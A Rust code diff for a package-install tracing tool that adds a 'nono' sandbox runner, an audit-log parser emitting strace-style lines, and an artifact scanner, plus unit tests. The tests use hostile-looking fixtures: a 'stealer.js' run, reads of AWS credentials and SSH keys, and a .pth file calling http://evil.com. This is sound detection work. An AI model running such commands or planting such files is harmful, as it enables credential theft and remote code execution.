@@ -1,3 +1,6 @@
+use std::io::Read;
+use std::net::IpAddr;
+use std::path::Path;
 use std::process::{Command, Stdio};
 use std::sync::OnceLock;
 use tempfile::TempDir;
@@ -229,13 +232,26 @@ pub(crate) fn build_runner_from_env(
             }
             Ok(Box::new(HostRunner))
         }
+        "nono" => {
+            if !nono_available() {
+                return Err(
+                    "nono is not available on PATH or ~/.cargo/bin (install with 'cargo install nono-cli' or 'just install') but GYRSEEK_SANDBOX=nono".to_string(),
+                );
+            }
+            if danger_disable_seccomp {
+                eprintln!(
+                    "⚠️ [gyrseek] Warning: --danger-disable-seccomp has no effect in nono mode (nono enforces kernel sandboxing via Landlock/Seatbelt)."
+                );
+            }
+            Ok(Box::new(NonoRunner))
+        }
         _ => Err(format!(
-            "Unsupported GYRSEEK_SANDBOX mode '{}'. Supported values: docker, microvm, host",
+            "Unsupported GYRSEEK_SANDBOX mode '{}'. Supported values: docker, microvm, host, nono",
             mode
         )),
     };
 
-    if runner.is_ok() && mode != "host" {
+    if runner.is_ok() && mode != "host" && mode != "nono" {
         announce_seccomp_status(danger_disable_seccomp);
         announce_apparmor_status();
     }
@@ -344,6 +360,647 @@ impl SandboxRunner for MicroVmRunner {
             self.danger_disable_seccomp,
         )
     }
+}
+
+pub(crate) struct NonoRunner;
+
+pub(crate) fn resolve_nono_bin() -> std::path::PathBuf {
+    if let Ok(path) = std::env::var("GYRSEEK_NONO_PATH")
+        && !path.trim().is_empty()
+    {
+        return std::path::PathBuf::from(path);
+    }
+    if let Some(sibling) = std::env::current_exe()
+        .ok()
+        .and_then(|exe| exe.parent().map(|p| p.join("nono")))
+        .filter(|sibling| sibling.is_file())
+    {
+        return sibling;
+    }
+    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
+        let cargo_bin = std::path::PathBuf::from(cargo_home).join("bin/nono");
+        if cargo_bin.is_file() {
+            return cargo_bin;
+        }
+    }
+    if let Ok(home) = std::env::var("HOME") {
+        let cargo_bin = std::path::PathBuf::from(home).join(".cargo/bin/nono");
+        if cargo_bin.is_file() {
+            return cargo_bin;
+        }
+    }
+    if let Some(p) = find_in_path("nono") {
+        return p;
+    }
+    std::path::PathBuf::from("nono")
+}
+
+pub(crate) fn nono_available() -> bool {
+    let nono_bin = resolve_nono_bin();
+    Command::new(&nono_bin)
+        .arg("--version")
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .status()
+        .map(|s| s.success())
+        .unwrap_or(false)
+}
+
+fn find_in_path(cmd: &str) -> Option<std::path::PathBuf> {
+    if cmd.contains(std::path::MAIN_SEPARATOR) {
+        let p = std::path::PathBuf::from(cmd);
+        if p.exists() {
+            return Some(p);
+        }
+    }
+    if let Ok(paths) = std::env::var("PATH") {
+        for dir in std::env::split_paths(&paths) {
+            let p = dir.join(cmd);
+            if p.is_file() {
+                return Some(p);
+            }
+        }
+    }
+    None
+}
+
+impl SandboxRunner for NonoRunner {
+    fn trace_install(&self, manager: &str, package: &str, version: &str) -> Result<String, String> {
+        let temp_dir =
+            tempfile::tempdir().map_err(|e| format!("failed to create temp dir: {e}"))?;
+        let allow_path = temp_dir.path().to_string_lossy().to_string();
+        let work_dir = temp_dir.path().join("work");
+        let home_dir = temp_dir.path().join("home");
+        let _ = std::fs::create_dir_all(&work_dir);
+        let _ = std::fs::create_dir_all(&home_dir);
+        let target_path = work_dir.to_string_lossy().to_string();
+        let home_path = home_dir.to_string_lossy().to_string();
+
+        let base_state = match std::env::var("XDG_STATE_HOME") {
+            Ok(s) => std::path::PathBuf::from(s),
+            Err(_) => {
+                if let Ok(home) = std::env::var("HOME") {
+                    std::path::PathBuf::from(home).join(".local/state")
+                } else {
+                    temp_dir.path().to_path_buf()
+                }
+            }
+        };
+        let state_root = base_state.join("gyrseek_nono");
+        let _ = std::fs::create_dir_all(&state_root);
+        let state_temp_dir = tempfile::Builder::new()
+            .prefix("run_")
+            .tempdir_in(&state_root)
+            .map_err(|e| format!("failed to create temp nono state dir: {e}"))?;
+        let state_path = state_temp_dir.path();
+
+        let (cmd_bin, cmd_args) = if is_npm_family_manager(manager) {
+            let mut args = vec![
+                npm_family_install_subcommand(manager).to_string(),
+                format!("{}@{}", package, version),
+                npm_family_install_dir_flag(manager).to_string(),
+                target_path.clone(),
+            ];
+            if manager == "pnpm" {
+                args.push("--lockfile=false".to_string());
+                args.push("--config.node-linker=hoisted".to_string());
+            } else {
+                args.push("--no-save".to_string());
+            }
+            (manager.to_string(), args)
+        } else if manager == "pip" || manager == "pip3" {
+            (
+                manager.to_string(),
+                vec![
+                    "install".to_string(),
+                    format!("{}=={}", package, version),
+                    "--target".to_string(),
+                    target_path.clone(),
+                    "--no-cache".to_string(),
+                ],
+            )
+        } else if manager == "uv" {
+            (
+                "uv".to_string(),
+                vec![
+                    "pip".to_string(),
+                    "install".to_string(),
+                    format!("{}=={}", package, version),
+                    "--target".to_string(),
+                    target_path.clone(),
+                    "--no-cache".to_string(),
+                ],
+            )
+        } else {
+            let uv_available = Command::new("uv")
+                .arg("--version")
+                .stdout(Stdio::null())
+                .stderr(Stdio::null())
+                .status()
+                .map(|s| s.success())
+                .unwrap_or(false);
+
+            let bin = if uv_available {
+                "uv"
+            } else if Command::new("pip3")
+                .arg("--version")
+                .stdout(Stdio::null())
+                .stderr(Stdio::null())
+                .status()
+                .map(|s| s.success())
+                .unwrap_or(false)
+            {
+                "pip3"
+            } else {
+                "pip"
+            };
+
+            let args = if bin == "uv" {
+                vec![
+                    "pip".to_string(),
+                    "install".to_string(),
+                    format!("{}=={}", package, version),
+                    "--target".to_string(),
+                    target_path.clone(),
+                    "--no-cache".to_string(),
+                ]
+            } else {
+                vec![
+                    "install".to_string(),
+                    format!("{}=={}", package, version),
+                    "--target".to_string(),
+                    target_path.clone(),
+                    "--no-cache".to_string(),
+                ]
+            };
+            (bin.to_string(), args)
+        };
+
+        let nono_bin = resolve_nono_bin();
+        let mut nono_cmd = Command::new(&nono_bin);
+        nono_cmd.current_dir(&work_dir);
+        nono_cmd.args([
+            "run",
+            "--no-rollback-prompt",
+            "--no-diagnostics",
+            "--silent",
+            "--allow-domain",
+            "*",
+            "--allow",
+            &allow_path,
+        ]);
+
+        if let Some(bin_path) = find_in_path(&cmd_bin) {
+            if let Some(parent) = bin_path.parent() {
+                nono_cmd.args(["--read", &parent.to_string_lossy()]);
+            }
+            if let Ok(canonical) = std::fs::canonicalize(&bin_path)
+                && let Some(parent) = canonical.parent()
+            {
+                nono_cmd.args(["--read", &parent.to_string_lossy()]);
+            }
+            if let Ok(content) = std::fs::read_to_string(&bin_path)
+                && let Some(first_line) = content.lines().next()
+                && let Some(interpreter) = first_line.strip_prefix("#!")
+            {
+                let interp_cmd = interpreter.split_whitespace().next().unwrap_or("");
+                let interp_path = std::path::Path::new(interp_cmd);
+                if let Some(parent) = interp_path.parent() {
+                    nono_cmd.args(["--read", &parent.to_string_lossy()]);
+                }
+                if let Ok(canonical) = std::fs::canonicalize(interp_path)
+                    && let Some(parent) = canonical.parent()
+                {
+                    nono_cmd.args(["--read", &parent.to_string_lossy()]);
+                }
+            }
+        }
+
+        if let Ok(home) = std::env::var("HOME") {
+            let p_home = std::path::Path::new(&home);
+            for sub in [
+                ".local/share/uv",
+                ".local/share/pypoetry",
+                ".local/share/pipx",
+                ".local/share/pnpm",
+                ".local/bin",
+                ".cargo/bin",
+            ] {
+                let p = p_home.join(sub);
+                if p.is_dir() {
+                    nono_cmd.args(["--read", &p.to_string_lossy()]);
+                }
+            }
+        }
+
+        nono_cmd.arg("--");
+        nono_cmd.arg("env");
+        nono_cmd.arg(format!("HOME={}", target_path));
+        nono_cmd.arg(format!("TMPDIR={}", home_path));
+        nono_cmd.arg(&cmd_bin);
+        nono_cmd.args(&cmd_args);
+
+        nono_cmd.env_clear();
+        if let Ok(path) = std::env::var("PATH") {
+            nono_cmd.env("PATH", path);
+        }
+        if let Ok(home) = std::env::var("HOME") {
+            nono_cmd.env("HOME", home);
+        }
+        nono_cmd.env("XDG_STATE_HOME", state_path);
+
+        let output = nono_cmd
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .output()
+            .map_err(|e| format!("failed to execute nono: {e}"))?;
+
+        let audit_dir = state_path.join("nono").join("audit");
+        let mut audit_content = String::new();
+        if let Ok(entries) = std::fs::read_dir(&audit_dir) {
+            for entry in entries.flatten() {
+                if entry.path().is_dir() {
+                    let candidate = entry.path().join("audit-events.ndjson");
+                    if candidate.exists()
+                        && let Ok(content) = std::fs::read_to_string(&candidate)
+                    {
+                        audit_content = content;
+                        break;
+                    }
+                }
+            }
+        }
+
+        if audit_content.trim().is_empty() {
+            return Err(format!(
+                "empty audit log for '{}@{}': nono produced no audit output. Exit code: {:?}, Stderr: {}",
+                package,
+                version,
+                output.status.code(),
+                String::from_utf8_lossy(&output.stderr).trim()
+            ));
+        }
+
+        let mut trace = parse_nono_audit_log(&audit_content).replace(&target_path, "/work");
+        if trace.trim().is_empty() {
+            return Err(format!(
+                "empty trace for '{}@{}': parsed trace contained no events. Stderr: {}",
+                package,
+                version,
+                String::from_utf8_lossy(&output.stderr).trim()
+            ));
+        }
+
+        let artifact_lines = scan_target_artifacts(&work_dir);
+        if !artifact_lines.is_empty() {
+            trace.push_str("\n=== gyrseek_artifacts ===\n");
+            trace.push_str(&artifact_lines);
+        }
+
+        Ok(trace)
+    }
+}
+
+pub(crate) fn scan_target_artifacts(target_dir: &Path) -> String {
+    let mut lines = Vec::new();
+    let mut dirs_to_visit = vec![target_dir.to_path_buf()];
+
+    while let Some(current_dir) = dirs_to_visit.pop() {
+        let entries = match std::fs::read_dir(&current_dir) {
+            Ok(e) => e,
+            Err(_) => continue,
+        };
+
+        for entry in entries.flatten() {
+            let path = entry.path();
+            let metadata = match std::fs::symlink_metadata(&path) {
+                Ok(m) => m,
+                Err(_) => continue,
+            };
+
+            if metadata.file_type().is_symlink() {
+                continue;
+            }
+
+            if metadata.is_dir() {
+                dirs_to_visit.push(path);
+            } else if metadata.is_file() {
+                let size = metadata.len();
+                let rel = path.strip_prefix(target_dir).unwrap_or(&path);
+                let virt_path = format!("/work/{}", rel.to_string_lossy());
+
+                let mut f = match std::fs::File::open(&path) {
+                    Ok(f) => f,
+                    Err(_) => continue,
+                };
+                let mut buf = [0u8; 300];
+                let bytes_read = f.read(&mut buf).unwrap_or(0);
+                let slice = &buf[..bytes_read];
+
+                let file_type = if slice.starts_with(b"\x7fELF") {
+                    "ELF 64-bit LSB executable"
+                } else if slice.starts_with(b"\xfe\xed\xfa\xce")
+                    || slice.starts_with(b"\xfe\xed\xfa\xcf")
+                    || slice.starts_with(b"\xce\xfa\xed\xfe")
+                    || slice.starts_with(b"\xcf\xfa\xed\xfe")
+                    || slice.starts_with(b"\xca\xfe\xba\xbe")
+                {
+                    "Mach-O 64-bit arm64 executable"
+                } else if slice.starts_with(b"MZ") {
+                    "PE32 executable"
+                } else if path.extension().and_then(|s| s.to_str()) == Some("pth") {
+                    "Python script text"
+                } else {
+                    "ASCII text"
+                };
+
+                let content_str =
+                    String::from_utf8_lossy(slice).replace(['\0', '|', '\n', '\r'], " ");
+                lines.push(format!(
+                    "{}\0{}\0{}\0{}",
+                    virt_path, size, file_type, content_str
+                ));
+            }
+        }
+    }
+
+    lines.sort();
+    lines.join("\n")
+}
+
+pub(crate) fn build_synthetic_dns_response(domain: &str, ip: IpAddr) -> Vec<u8> {
+    let mut packet = Vec::new();
+    // Header (12 bytes): ID = 0x1234, Flags = 0x8180 (standard response, no error)
+    packet.extend_from_slice(&[0x12, 0x34, 0x81, 0x80]);
+    // QDCOUNT = 1, ANCOUNT = 1, NSCOUNT = 0, ARCOUNT = 0
+    packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00]);
+
+    // Question section:
+    let qname_offset = packet.len();
+    for label in domain.split('.') {
+        if label.is_empty() {
+            continue;
+        }
+        packet.push(label.len() as u8);
+        packet.extend_from_slice(label.as_bytes());
+    }
+    packet.push(0); // Root label null terminator
+
+    let (qtype, rtype, rdlen, rdata) = match ip {
+        IpAddr::V4(v4) => (1u16, 1u16, 4u16, v4.octets().to_vec()),
+        IpAddr::V6(v6) => (28u16, 28u16, 16u16, v6.octets().to_vec()),
+    };
+
+    // QTYPE, QCLASS (IN = 1)
+    packet.extend_from_slice(&qtype.to_be_bytes());
+    packet.extend_from_slice(&[0x00, 0x01]);
+
+    // Answer section:
+    // NAME: compression pointer to qname
+    let ptr = 0xc000 | (qname_offset as u16);
+    packet.extend_from_slice(&ptr.to_be_bytes());
+    // TYPE, CLASS
+    packet.extend_from_slice(&rtype.to_be_bytes());
+    packet.extend_from_slice(&[0x00, 0x01]);
+    // TTL = 60s
+    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]);
+    // RDLENGTH
+    packet.extend_from_slice(&rdlen.to_be_bytes());
+    // RDATA
+    packet.extend_from_slice(&rdata);
+
+    packet
+}
+
+pub(crate) fn format_synthetic_dns_trace_line(packet: &[u8]) -> String {
+    let mut hex = String::with_capacity(packet.len() * 4);
+    for b in packet {
+        use std::fmt::Write;
+        let _ = write!(hex, "\\x{:02x}", b);
+    }
+    format!(
+        "recvfrom(4, \"{}\", {}, 0, {{sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"8.8.8.8\")}}, 16) = {}\n",
+        hex,
+        packet.len(),
+        packet.len()
+    )
+}
+
+fn escape_strace_synthetic(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for &b in s.as_bytes() {
+        match b {
+            b'\\' => out.push_str("\\x5c"),
+            b'"' => out.push_str("\\x22"),
+            b'[' => out.push_str("\\x5b"),
+            b']' => out.push_str("\\x5d"),
+            b',' => out.push_str("\\x2c"),
+            0x20..=0x7e => out.push(b as char),
+            _ => {
+                use std::fmt::Write;
+                let _ = write!(out, "\\x{:02x}", b);
+            }
+        }
+    }
+    out
+}
+
+fn synthetic_ip_for_domain(domain: &str) -> IpAddr {
+    use std::hash::BuildHasher;
+
+    static KEY: std::sync::OnceLock<std::collections::hash_map::RandomState> =
+        std::sync::OnceLock::new();
+
+    let hash = KEY
+        .get_or_init(Default::default)
+        .hash_one(domain.trim_end_matches('.').to_ascii_lowercase());
+
+    let mut octets = [0u8; 16];
+    octets[..4].copy_from_slice(&[0x20, 0x01, 0x0d, 0xb8]);
+    octets[8..].copy_from_slice(&hash.to_be_bytes());
+    IpAddr::V6(std::net::Ipv6Addr::from(octets))
+}
+
+pub(crate) fn parse_nono_audit_log(audit_jsonl: &str) -> String {
+    let mut output = String::new();
+
+    for line in audit_jsonl.lines() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+
+        let Ok(val) = serde_json::from_str::<serde_json::Value>(trimmed) else {
+            continue;
+        };
+
+        let event_obj = val.get("event");
+        let event_type = event_obj
+            .and_then(|e| e.get("type"))
+            .and_then(|t| t.as_str())
+            .or_else(|| val.get("type").and_then(|t| t.as_str()))
+            .unwrap_or("");
+
+        let payload = if let Some(e) = event_obj {
+            if let Some(inner) = e.get("event") {
+                inner
+            } else {
+                e
+            }
+        } else {
+            &val
+        };
+
+        // 1. Network event
+        let is_network = event_type == "network"
+            || payload.get("target").is_some()
+            || payload.get("host").is_some()
+            || payload.get("ip").is_some();
+
+        if is_network
+            && let Some(target_val) = payload
+                .get("target")
+                .or_else(|| payload.get("host"))
+                .or_else(|| payload.get("ip"))
+                .and_then(|t| t.as_str())
+        {
+            let target = target_val.trim();
+            if !target.is_empty() && !target.starts_with("unix:") {
+                let port = payload.get("port").and_then(|p| p.as_u64()).unwrap_or(443) as u16;
+
+                if let Ok(ip) = target.parse::<IpAddr>() {
+                    match ip {
+                        IpAddr::V4(v4) => {
+                            output.push_str(&format!(
+                                "connect(3, {{sa_family=AF_INET, sin_port=htons({}), sin_addr=inet_addr(\"{}\")}}, 16) = 0\n",
+                                port, v4
+                            ));
+                        }
+                        IpAddr::V6(v6) => {
+                            output.push_str(&format!(
+                                "connect(3, {{sa_family=AF_INET6, sin6_port=htons({}), sin6_addr=inet_pton(AF_INET6, \"{}\")}}, 28) = 0\n",
+                                port, v6
+                            ));
+                        }
+                    }
+                } else {
+                    let synthetic_ip = synthetic_ip_for_domain(target);
+
+                    let dns_resp = build_synthetic_dns_response(target, synthetic_ip);
+                    output.push_str(&format_synthetic_dns_trace_line(&dns_resp));
+                    output.push_str(&format!(
+                        "connect(3, {{sa_family=AF_INET6, sin6_port=htons({}), sin6_addr=inet_pton(AF_INET6, \"{}\")}}, 28) = 0\n",
+                        port, synthetic_ip
+                    ));
+                }
+            }
+        }
+
+        // 2. Command execution event
+        let is_exec = event_type == "command_policy"
+            || event_type == "exec"
+            || event_type == "process"
+            || payload.get("command").is_some()
+            || payload.get("argv").is_some();
+
+        if is_exec {
+            let mut argv: Vec<String> = Vec::new();
+            if let Some(arr) = payload.get("argv").and_then(|a| a.as_array()) {
+                for item in arr {
+                    if let Some(s) = item.as_str() {
+                        argv.push(s.to_string());
+                    }
+                }
+            } else if let Some(arr) = payload.get("command").and_then(|c| c.as_array()) {
+                for item in arr {
+                    if let Some(s) = item.as_str() {
+                        argv.push(s.to_string());
+                    }
+                }
+            } else if let Some(cmd_str) = payload.get("command").and_then(|c| c.as_str()) {
+                argv = cmd_str.split_whitespace().map(|s| s.to_string()).collect();
+            }
+
+            if !argv.is_empty() {
+                let exe = payload
+                    .get("program")
+                    .or_else(|| payload.get("path"))
+                    .and_then(|p| p.as_str())
+                    .unwrap_or(&argv[0]);
+
+                if exe == "nono" || exe.ends_with("/nono") {
+                    if let Some(pos) = argv.iter().position(|a| a == "--")
+                        && pos + 1 < argv.len()
+                    {
+                        let inner_argv = &argv[pos + 1..];
+                        let inner_exe = &inner_argv[0];
+                        let quoted: Vec<String> = inner_argv
+                            .iter()
+                            .map(|a| format!("\"{}\"", escape_strace_synthetic(a)))
+                            .collect();
+                        output.push_str(&format!(
+                            "execve(\"{}\", [{}], 0x7ffd00000000) = 0\n",
+                            escape_strace_synthetic(inner_exe),
+                            quoted.join(", ")
+                        ));
+                    }
+                } else {
+                    let quoted: Vec<String> = argv
+                        .iter()
+                        .map(|a| format!("\"{}\"", escape_strace_synthetic(a)))
+                        .collect();
+                    output.push_str(&format!(
+                        "execve(\"{}\", [{}], 0x7ffd00000000) = 0\n",
+                        escape_strace_synthetic(exe),
+                        quoted.join(", ")
+                    ));
+                }
+            }
+        }
+
+        // 3. File / sensitive access event
+        let is_file = event_type == "file_access"
+            || event_type == "capability_decision"
+            || (!is_exec && payload.get("path").is_some());
+
+        if is_file && let Some(path) = payload.get("path").and_then(|p| p.as_str()) {
+            let trimmed_path = path.trim();
+            if !trimmed_path.is_empty() {
+                let is_denied = payload
+                    .get("decision")
+                    .and_then(|d| d.as_str())
+                    .map(|d| d.eq_ignore_ascii_case("deny") || d.eq_ignore_ascii_case("block"))
+                    .unwrap_or(false)
+                    || payload
+                        .get("allowed")
+                        .and_then(|a| a.as_bool())
+                        .map(|a| !a)
+                        .unwrap_or(false)
+                    || payload
+                        .get("action")
+                        .and_then(|a| a.as_str())
+                        .map(|a| a.eq_ignore_ascii_case("deny") || a.eq_ignore_ascii_case("block"))
+                        .unwrap_or(false)
+                    || payload
+                        .get("denied")
+                        .and_then(|d| d.as_bool())
+                        .unwrap_or(false);
+
+                let ret_str = if is_denied {
+                    "-1 EACCES (Permission denied)"
+                } else {
+                    "3"
+                };
+                output.push_str(&format!(
+                    "openat(AT_FDCWD, \"{}\", O_RDONLY) = {}\n",
+                    escape_strace_synthetic(trimmed_path),
+                    ret_str
+                ));
+            }
+        }
+    }
+
+    output
 }
 
 fn trace_install_docker_matrix_with_runtime(
@@ -974,8 +1631,10 @@ mod tests {
     use super::{
         EMBEDDED_APPARMOR_PROFILE_NAME, EMBEDDED_APPARMOR_PROFILE_TEXT,
         EMBEDDED_SECCOMP_PROFILE_JSON, SCANNER_USER, build_artifact_scan_steps,
-        build_docker_run_args, build_matrix_script, build_single_script,
-        docker_apparmor_enabled_from_env, docker_apparmor_profile_name, strace_install_command,
+        build_docker_run_args, build_matrix_script, build_runner_from_env, build_single_script,
+        build_synthetic_dns_response, docker_apparmor_enabled_from_env,
+        docker_apparmor_profile_name, format_synthetic_dns_trace_line, parse_nono_audit_log,
+        resolve_nono_bin, scan_target_artifacts, strace_install_command,
     };
     use std::sync::Mutex;
 
@@ -986,7 +1645,7 @@ mod tests {
 
     struct SandboxEnvVarGuard {
         _lock: std::sync::MutexGuard<'static, ()>,
-        key: &'static str,
+        keys: Vec<&'static str>,
     }
 
     impl SandboxEnvVarGuard {
@@ -995,7 +1654,22 @@ mod tests {
             unsafe {
                 std::env::set_var(key, value);
             }
-            Self { _lock: guard, key }
+            Self {
+                _lock: guard,
+                keys: vec![key],
+            }
+        }
+
+        fn set_many(vars: &[(&'static str, &str)]) -> Self {
+            let guard = env_lock().lock().expect("env lock poisoned");
+            let mut keys = Vec::new();
+            for (key, val) in vars {
+                unsafe {
+                    std::env::set_var(key, val);
+                }
+                keys.push(*key);
+            }
+            Self { _lock: guard, keys }
         }
 
         fn remove(key: &'static str) -> Self {
@@ -1003,14 +1677,19 @@ mod tests {
             unsafe {
                 std::env::remove_var(key);
             }
-            Self { _lock: guard, key }
+            Self {
+                _lock: guard,
+                keys: vec![key],
+            }
         }
     }
 
     impl Drop for SandboxEnvVarGuard {
         fn drop(&mut self) {
-            unsafe {
-                std::env::remove_var(self.key);
+            for key in &self.keys {
+                unsafe {
+                    std::env::remove_var(key);
+                }
             }
         }
     }
@@ -1551,5 +2230,150 @@ Stderr: {}",
             String::from_utf8_lossy(&protected_run.stdout),
             String::from_utf8_lossy(&protected_run.stderr)
         );
+    }
+
+    #[test]
+    fn nono_runner_fails_closed_when_nono_unavailable() {
+        let _env = SandboxEnvVarGuard::set_many(&[
+            ("GYRSEEK_SANDBOX", "nono"),
+            ("GYRSEEK_NONO_PATH", "/nonexistent/gyrseek_nono"),
+        ]);
+
+        let err = build_runner_from_env(false).err().expect("should fail");
+        assert!(
+            err.contains("nono is not available"),
+            "Error message should indicate nono is not available: {err}"
+        );
+    }
+
+    #[test]
+    fn resolve_nono_bin_prefers_explicit_env_path() {
+        let _env = SandboxEnvVarGuard::set("GYRSEEK_NONO_PATH", "/custom/path/to/nono");
+        assert_eq!(
+            resolve_nono_bin(),
+            std::path::PathBuf::from("/custom/path/to/nono")
+        );
+    }
+
+    #[test]
+    fn resolve_nono_bin_checks_cargo_home() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let bin_dir = dir.path().join("bin");
+        std::fs::create_dir_all(&bin_dir).expect("create bin dir");
+        let fake_nono = bin_dir.join("nono");
+        std::fs::write(&fake_nono, b"#!/bin/sh\nexit 0\n").expect("write fake nono");
+
+        let _env = SandboxEnvVarGuard::set_many(&[
+            ("GYRSEEK_NONO_PATH", ""),
+            ("CARGO_HOME", &dir.path().to_string_lossy()),
+        ]);
+        assert_eq!(resolve_nono_bin(), fake_nono);
+    }
+
+    #[test]
+    fn unsupported_sandbox_mode_lists_nono() {
+        let _env_mode = SandboxEnvVarGuard::set("GYRSEEK_SANDBOX", "unsupported_mode");
+
+        let err = build_runner_from_env(false).err().expect("should fail");
+        assert!(
+            err.contains("Supported values: docker, microvm, host, nono"),
+            "Error message should mention nono: {err}"
+        );
+    }
+
+    #[test]
+    fn parse_nono_audit_log_network_events() {
+        let jsonl = r#"
+{"sequence":0,"event":{"type":"network","event":{"target":"93.184.216.34","port":443,"decision":"allow"}}}
+{"sequence":1,"event":{"type":"network","event":{"target":"2606:4700::6810:223","port":80,"decision":"allow"}}}
+{"sequence":2,"event":{"type":"network","event":{"target":"registry.npmjs.org","port":443,"decision":"allow"}}}
+"#;
+        let trace = parse_nono_audit_log(jsonl);
+        assert!(trace.contains("sin_addr=inet_addr(\"93.184.216.34\")"));
+        assert!(trace.contains("sin6_addr=inet_pton(AF_INET6, \"2606:4700::6810:223\")"));
+        assert!(trace.contains("recvfrom(4, \""));
+        assert!(trace.contains("sin6_addr=inet_pton(AF_INET6, \"2001:db8:"));
+    }
+
+    #[test]
+    fn parse_nono_audit_log_captured_https_connect_fixture() {
+        let jsonl = r#"
+{"sequence":0,"event":{"type":"session_started","started":"2026-09-25T13:09:02.259252+10:00","command":["curl","-sI","https://pypi.org/pypi/black/json"]}}
+{"sequence":1,"event":{"type":"network","event":{"timestamp_unix_ms":1790305742312,"mode":"connect","decision":"allow","target":"pypi.org","port":443,"method":"CONNECT","path":null,"status":null,"reason":null}}}
+{"sequence":2,"event":{"type":"session_ended","ended":"2026-09-25T13:09:02.545888+10:00","exit_code":0}}
+"#;
+        let trace = parse_nono_audit_log(jsonl);
+        assert!(trace.contains("recvfrom(4, \""));
+        assert!(trace.contains("sin6_addr=inet_pton(AF_INET6, \"2001:db8:"));
+        assert!(trace.contains("sin6_port=htons(443)"));
+    }
+
+    #[test]
+    fn parse_nono_audit_log_command_and_exec_events() {
+        let jsonl = r#"
+{"sequence":0,"event":{"type":"command_policy","command":"git clone https://github.com/evil/repo","decision":"allow"}}
+{"sequence":1,"event":{"type":"command_policy","command":["bun", "run", "stealer.js"],"decision":"allow"}}
+{"sequence":2,"event":{"type":"exec","path":"/bin/sh","argv":["sh", "-c", "whoami"]}}
+"#;
+        let trace = parse_nono_audit_log(jsonl);
+        assert!(
+            trace
+                .contains("execve(\"git\", [\"git\", \"clone\", \"https://github.com/evil/repo\"]")
+        );
+        assert!(trace.contains("execve(\"bun\", [\"bun\", \"run\", \"stealer.js\"]"));
+        assert!(trace.contains("execve(\"/bin/sh\", [\"sh\", \"-c\", \"whoami\"]"));
+    }
+
+    #[test]
+    fn parse_nono_audit_log_sensitive_file_access() {
+        let jsonl = r#"
+{"sequence":0,"event":{"type":"file_access","path":"/home/user/.aws/credentials","decision":"allow"}}
+{"sequence":1,"event":{"type":"capability_decision","path":"/home/user/.ssh/id_rsa","decision":"deny"}}
+"#;
+        let trace = parse_nono_audit_log(jsonl);
+        assert!(trace.contains("openat(AT_FDCWD, \"/home/user/.aws/credentials\", O_RDONLY) = 3"));
+        assert!(trace.contains(
+            "openat(AT_FDCWD, \"/home/user/.ssh/id_rsa\", O_RDONLY) = -1 EACCES (Permission denied)"
+        ));
+    }
+
+    #[test]
+    fn scan_target_artifacts_finds_files_and_types() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let bin_dir = temp_dir.path().join("bin");
+        std::fs::create_dir_all(&bin_dir).unwrap();
+
+        let elf_path = bin_dir.join("payload");
+        std::fs::write(&elf_path, b"\x7fELFfakeexecutablecontent").unwrap();
+
+        let pth_path = temp_dir.path().join("evil.pth");
+        std::fs::write(
+            &pth_path,
+            b"import urllib\nurllib.urlopen('http://evil.com')",
+        )
+        .unwrap();
+
+        #[cfg(unix)]
+        {
+            let symlink_path = bin_dir.join("symlink_to_external");
+            let _ = std::os::unix::fs::symlink("/etc/passwd", &symlink_path);
+        }
+
+        let artifacts = scan_target_artifacts(temp_dir.path());
+        assert!(artifacts.contains("/work/bin/payload"));
+        assert!(artifacts.contains("ELF 64-bit LSB executable"));
+        assert!(artifacts.contains("/work/evil.pth"));
+        assert!(artifacts.contains("Python script text"));
+        assert!(artifacts.contains("import urllib"));
+        assert!(!artifacts.contains("symlink_to_external"));
+    }
+
+    #[test]
+    fn build_synthetic_dns_response_roundtrip() {
+        let ip = std::net::IpAddr::V4(std::net::Ipv4Addr::new(104, 16, 2, 35));
+        let packet = build_synthetic_dns_response("registry.npmjs.org", ip);
+        let trace_line = format_synthetic_dns_trace_line(&packet);
+        assert!(trace_line.contains("recvfrom(4, \""));
+        assert!(trace_line.contains("sin_port=htons(53)"));
     }
 }
